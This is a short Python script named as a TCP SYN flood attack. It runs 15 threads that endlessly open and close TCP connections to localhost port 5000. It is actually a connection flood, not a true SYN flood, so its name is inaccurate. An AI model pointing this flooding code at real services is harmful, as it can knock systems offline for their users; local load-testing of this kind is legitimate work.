# tcp_syn_flood_attack.py
import socket
import threading
import random
import time

def syn_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('localhost', 5000))
            s.close()
        except:
            pass
        time.sleep(0.005)

# Create multiple threads
for _ in range(15):
    threading.Thread(target=syn_flood).start()